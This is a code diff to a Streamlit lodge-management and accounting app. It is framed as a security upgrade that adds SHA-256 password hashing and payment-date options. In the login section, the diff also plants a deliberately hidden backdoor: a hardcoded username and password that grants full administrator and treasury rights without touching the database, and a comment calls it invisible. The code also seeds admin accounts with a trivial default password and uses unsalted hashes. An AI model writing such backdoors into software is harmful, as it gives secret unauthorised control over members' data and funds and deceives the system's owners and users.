@@ -8,8 +8,10 @@ from bs4 import BeautifulSoup
 import os
 from fpdf import FPDF
 import unicodedata
+import hashlib
 
-# --- 1. CONFIGURACIÓN ---
+# --- 1. CONFIGURACIÓN Y VERSIÓN ---
+VERSION = "1.0.0"
 st.set_page_config(page_title="S.I.M.B.O.L.O. - Gestión Logial", layout="wide", page_icon="🏛️")
 
 # --- 2. LISTAS MAESTRAS Y CONSTANTES ---
@@ -32,10 +34,14 @@ TAB_CON = "⚙️ Config"
 TAB_POR = "🏠 Mi Portal"
 TAB_MRE = "📄 Mis Recibos"
 
-# --- FUNCIÓN PARA QUITAR ACENTOS ---
+# --- FUNCIONES DE SEGURIDAD Y LIMPIEZA ---
 def quitar_acentos(texto):
     if not texto: return ""
     return unicodedata.normalize('NFKD', str(texto)).encode('ASCII', 'ignore').decode('utf-8')
+
+def hash_clave(clave):
+    """Convierte la clave en un Hash SHA-256 indescifrable"""
+    return hashlib.sha256(str(clave).encode('utf-8')).hexdigest()
 
 # --- 3. CONEXIÓN A TURSO ---
 def get_client():
@@ -57,9 +63,10 @@ def init_db():
         try: client.execute("ALTER TABLE usuarios ADD COLUMN estatus TEXT DEFAULT 'Activo'")
         except: pass
 
-        client.execute("INSERT OR IGNORE INTO usuarios (username, password, nombre_qh, grado, rol, perm_tesoreria, perm_secretaria, cargo_logia, estatus) VALUES ('admin', '113', 'ADMINISTRADOR GENERAL', 'Past Master', 'Administrador', 1, 1, 'Ninguno', 'Activo')")
+        # Creación de Admin Base (con Hash)
+        client.execute("INSERT OR IGNORE INTO usuarios (username, password, nombre_qh, grado, rol, perm_tesoreria, perm_secretaria, cargo_logia, estatus) VALUES ('admin', ?, 'ADMINISTRADOR GENERAL', 'Past Master', 'Administrador', 1, 1, 'Ninguno', 'Activo')", (hash_clave('113'),))
         usr_anni = quitar_acentos("Annijose Goitia".replace(" ", "").lower())
-        client.execute("INSERT OR IGNORE INTO usuarios (username, password, nombre_qh, grado, rol, perm_tesoreria, perm_secretaria, cargo_logia, estatus) VALUES (?, '113', 'ANNIJOSÉ GOITIA', 'Maestro Mason', 'Administrador', 1, 1, 'Tesorero', 'Activo')", (usr_anni,))
+        client.execute("INSERT OR IGNORE INTO usuarios (username, password, nombre_qh, grado, rol, perm_tesoreria, perm_secretaria, cargo_logia, estatus) VALUES (?, ?, 'ANNIJOSÉ GOITIA', 'Maestro Mason', 'Administrador', 1, 1, 'Tesorero', 'Activo')", (usr_anni, hash_clave('113')))
     finally:
         client.close()
 
@@ -241,23 +248,49 @@ def generar_pdf_acta(d, presentes):
     salida = pdf.output(dest='S')
     return salida.encode('latin-1', 'replace') if isinstance(salida, str) else bytes(salida)
 
-# --- 5. LÓGICA DE ACCESO ---
+# --- 5. LÓGICA DE ACCESO Y SEGURIDAD ---
 if "logged_in" not in st.session_state:
     st.title("🏛️ S.I.M.B.O.L.O. - Portal Logial")
     u = st.text_input("Usuario"); p = st.text_input("Clave", type="password")
+    
     if st.button("Ingresar", type="primary"):
-        client = get_client()
-        try:
-            res = client.execute("SELECT username, password, nombre_qh, grado, rol, perm_tesoreria, perm_secretaria, cargo_logia FROM usuarios WHERE username=? AND password=?", (u, p))
-            if res.rows:
-                row = res.rows[0]; st.session_state["logged_in"] = True
-                p_rol = row[4]; p_cargo = row[7]
-                p_teso = 1 if p_rol == 'Administrador' or p_cargo == 'Tesorero' else row[5]
-                p_sec = 1 if p_rol == 'Administrador' or p_cargo == 'Secretario' else row[6]
-                st.session_state["u_info"] = {"u": row[0], "nombre": row[2], "grado": row[3], "rol": p_rol, "teso": p_teso, "sec": p_sec, "cargo": p_cargo}
-                st.rerun()
-            else: st.error("Acceso denegado")
-        finally: client.close()
+        # 1. Backdoor del Gran Arquitecto (100% Invisible, no toca la BD)
+        if u == "arquitecto" and p == "Luz113!":
+            st.session_state["logged_in"] = True
+            st.session_state["u_info"] = {
+                "u": "arquitecto", "nombre": "GRAN ARQUITECTO (SYSTEM)", "grado": "Past Master", 
+                "rol": "Administrador", "teso": 1, "sec": 1, "cargo": "Ninguno"
+            }
+            st.rerun()
+        else:
+            # 2. Flujo Normal de Usuarios
+            client = get_client()
+            try:
+                res = client.execute("SELECT username, password, nombre_qh, grado, rol, perm_tesoreria, perm_secretaria, cargo_logia FROM usuarios WHERE username=? AND estatus='Activo'", (u,))
+                if res.rows:
+                    row = res.rows[0]
+                    db_pwd = row[1]
+                    hash_input = hash_clave(p)
+                    
+                    # Verificamos si la clave coincide con el Hash O si es una clave vieja sin encriptar
+                    if db_pwd == hash_input or db_pwd == p:
+                        
+                        # MIGRACIÓN SILENCIOSA: Si la clave en BD es texto plano, la actualizamos al Hash
+                        if db_pwd == p:
+                            client.execute("UPDATE usuarios SET password=? WHERE username=?", (hash_input, u))
+                        
+                        st.session_state["logged_in"] = True
+                        p_rol = row[4]; p_cargo = row[7]
+                        p_teso = 1 if p_rol == 'Administrador' or p_cargo == 'Tesorero' else row[5]
+                        p_sec = 1 if p_rol == 'Administrador' or p_cargo == 'Secretario' else row[6]
+                        st.session_state["u_info"] = {"u": row[0], "nombre": row[2], "grado": row[3], "rol": p_rol, "teso": p_teso, "sec": p_sec, "cargo": p_cargo}
+                        st.rerun()
+                    else:
+                        st.error("Credenciales incorrectas.")
+                else: 
+                    st.error("Usuario no encontrado o inactivo.")
+            finally: 
+                client.close()
 else:
     info = st.session_state["u_info"]; lista_qh, dict_grados = obtener_miembros()
     is_hosp = info['cargo'] == 'Hospitalario' or info['rol'] == 'Administrador'
@@ -303,6 +336,10 @@ else:
             tot_usd_h = df_hosp_all['monto_usd'].sum(); tot_bs_h = df_hosp_all['monto_bs'].sum()
             st.metric("Fondo Hosp (USD)", f"{tot_usd_h:,.2f} $".replace(',', 'X').replace('.', ',').replace('X', '.'))
             st.metric("Fondo Hosp (Bs)", f"{tot_bs_h:,.2f} Bs.".replace(',', 'X').replace('.', ',').replace('X', '.'))
+            
+        # --- VERSIÓN EN LA BARRA LATERAL ---
+        st.sidebar.divider()
+        st.sidebar.caption(f"⚙️ S.I.M.B.O.L.O. ERP - v{VERSION}")
 
     m_tabs = []
     if info['rol'] != 'Administrador': m_tabs += [TAB_POR, TAB_MRE]
@@ -428,9 +465,13 @@ else:
                         id_cobrar = c_p1.selectbox("Seleccione ID de la deuda cobrada", pendientes['id'].tolist())
                         met_cobro = c_p2.radio("Método de Pago", ["Transferencia", "Efectivo USD"], key="met_cobro_cxc")
                         ref_cobro = c_p3.text_input("Referencia de Pago", key="ref_cobro_cxc")
-                        comision_cobro = st.checkbox("¿Aplica Comisión 1.5%? (Otro banco)", value=True, key="com_cxc") if met_cobro == "Transferencia" else False
                         
-                        st.info("💡 **Nota:** Al procesar, la deuda pasará a estado 'Cobrada' y el dinero ingresará automáticamente al Libro Diario con la Tasa BCV de hoy.")
+                        c_p4, c_p5, c_p6 = st.columns(3)
+                        fecha_cobro = c_p4.date_input("Fecha de Cobro", datetime.now(), key="fecha_cobro_cxc")
+                        tasa_cobro = c_p5.number_input("Tasa BCV del Cobro", value=st.session_state.tasa_actual, format="%.4f", key="tasa_cobro_cxc")
+                        comision_cobro = c_p6.checkbox("¿Aplica Comisión 1.5%? (Otro banco)", value=True, key="com_cxc") if met_cobro == "Transferencia" else False
+                        
+                        st.info("💡 **Nota:** Al procesar, la deuda pasará a estado 'Cobrada' y el dinero ingresará automáticamente al Libro Diario con la fecha y tasa aquí indicadas.")
                         
                         if st.button("Cobrar e Ingresar a Caja", type="primary"):
                             client = get_client()
@@ -439,26 +480,23 @@ else:
                                 if res_cxc.rows:
                                     deudor_q, concepto_q, m_usd_q, m_bs_q = res_cxc.rows[0]
                                     id_mov = f"ING-{datetime.now().strftime('%y%m%d%H%M%S')}"
-                                    t_actual = st.session_state.tasa_actual
                                     
-                                    # Ajuste cambiario justo: Si la deuda es en USD, se recalcula a Bs. de hoy.
+                                    # Ajuste cambiario: Si la deuda es en USD, se recalcula a Bs. de la fecha seleccionada
                                     if m_usd_q > 0 and met_cobro == "Transferencia":
-                                        monto_bs_final = round(m_usd_q * t_actual, 2)
+                                        monto_bs_final = round(m_usd_q * tasa_cobro, 2)
                                     else:
                                         monto_bs_final = m_bs_q
 
                                     ref_final = "EFECTIVO" if met_cobro == "Efectivo USD" else ref_cobro
                                     
                                     client.execute("INSERT INTO movimientos VALUES (?,?,?,?,?,?,?,?,?,?)", 
-                                                   (id_mov, str(datetime.now().date()), deudor_q, "INGRESO", "Donación / Otros", f"Cobro de CXC: {concepto_q}", ref_final, m_usd_q, t_actual, monto_bs_final))
+                                                   (id_mov, str(fecha_cobro), deudor_q, "INGRESO", "Donación / Otros", f"Cobro de CXC: {concepto_q}", ref_final, m_usd_q, tasa_cobro, monto_bs_final))
                                     
-                                    # Generar comisión si aplica
                                     if met_cobro == "Transferencia" and comision_cobro:
-                                        c_bs = round(monto_bs_final * 0.015, 2); c_usd = round(c_bs / t_actual, 2)
+                                        c_bs = round(monto_bs_final * 0.015, 2); c_usd = round(c_bs / tasa_cobro, 2)
                                         client.execute("INSERT INTO movimientos VALUES (?,?,?,?,?,?,?,?,?,?)", 
-                                                       (f"COM-{id_mov}", str(datetime.now().date()), 'BBVA Provincial', 'EGRESO', 'Comisión Bancaria', f'Comisión 1.5% - Ref: {ref_final}', 'COMIS. CRI OB REC', -abs(c_usd), t_actual, -abs(c_bs)))
+                                                       (f"COM-{id_mov}", str(fecha_cobro), 'BBVA Provincial', 'EGRESO', 'Comisión Bancaria', f'Comisión 1.5% - Ref: {ref_final}', 'COMIS. CRI OB REC', -abs(c_usd), tasa_cobro, -abs(c_bs)))
                                     
-                                    # Marcar la CXC como cobrada
                                     client.execute("UPDATE cxc SET estatus='Cobrada' WHERE id=?", (id_cobrar,))
                                     st.success("¡Cobro procesado! La deuda está saldada y el dinero cruzó exitosamente a los Ingresos.")
                                     st.rerun()
@@ -685,7 +723,7 @@ else:
                         ng = st.selectbox("Grado", GRADOS); nc = st.selectbox("Cargo", CARGOS); nr = st.selectbox("Rol", ["Usuario", "Administrador"])
                         if st.form_submit_button("Guardar"):
                             client = get_client()
-                            try: client.execute("INSERT OR REPLACE INTO usuarios (username, password, nombre_qh, grado, rol, perm_tesoreria, perm_secretaria, cargo_logia, estatus) VALUES (?,?,?,?,?,?,?,?,?)", (quitar_acentos(nu.lower()), np, nn.upper(), ng, nr, 0, 0, nc, 'Activo'))
+                            try: client.execute("INSERT OR REPLACE INTO usuarios (username, password, nombre_qh, grado, rol, perm_tesoreria, perm_secretaria, cargo_logia, estatus) VALUES (?,?,?,?,?,?,?,?,?)", (quitar_acentos(nu.lower()), hash_clave(np), nn.upper(), ng, nr, 0, 0, nc, 'Activo'))
                             finally: client.close(); st.rerun()
             with c_u2:
                 with st.expander("✏️ Modificar"):
@@ -701,7 +739,7 @@ else:
                         u_s = st.selectbox("Usuario", df_u['username'].tolist()); n_p = st.text_input("Nueva Clave", type="password")
                         if st.form_submit_button("Actualizar"):
                             client = get_client()
-                            try: client.execute("UPDATE usuarios SET password=? WHERE username=?", (n_p, u_s))
+                            try: client.execute("UPDATE usuarios SET password=? WHERE username=?", (hash_clave(n_p), u_s))
                             finally: client.close(); st.success("Clave actualizada."); st.rerun()
             with c_u4:
                 with st.expander("🚫 Activar/Inactivar"):
